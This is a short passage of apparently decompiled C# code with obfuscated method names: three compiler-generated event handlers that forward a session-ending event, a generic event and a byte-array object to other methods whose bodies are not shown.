	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_31(object sender, SessionEndingEventArgs e)
	{
		method_18();
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_32(object sender, EventArgs e)
	{
		method_21();
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_33(object object_4)
	{
		method_22((byte[])object_4);
	}
}
